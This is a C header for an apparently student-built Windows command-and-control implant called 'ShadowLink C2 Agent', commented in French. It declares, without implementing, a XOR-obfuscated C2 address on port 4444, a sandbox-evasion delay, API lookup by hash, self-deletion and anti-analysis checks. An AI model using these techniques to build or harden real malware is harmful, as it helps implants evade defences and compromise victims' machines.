/*
 * ShadowLink C2 Agent
 * Phase 7: File Transfer + Process Management
 *   - Upload/Download files
 *   - Process list (ps)
 *   - Kill process
 * 
 * Compilation: make agent
 */

#ifndef AGENT_H
#define AGENT_H


// Headers Windows SEULEMENT
#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string.h>

// Configuration - Chiffrées avec XOR key 0x5A
// Ces valeurs seront déchiffrées au runtime
// Original: "127.0.0.1" XOR 0x5A = "k}~4z4z4k"
// Port: 4444 (stocké en clair car int)
#define SERVER_PORT 4444

// XOR Key pour le déchiffrement des strings
#define XOR_KEY 0x5A

// Délai d'exécution initial (en ms) pour contourner les sandbox
#define INITIAL_DELAY 10000  // 10 secondes

// Prototypes pour les techniques avancées
void xor_decrypt(char *data, size_t len, unsigned char key);
char* get_decrypted_server_ip(void);
unsigned long djb2_hash(const char *str);
FARPROC resolve_api(HMODULE module, unsigned long hash);
int self_delete(void);
int delayed_execution(DWORD delay_ms);
int detect_fast_execution(void);

#endif

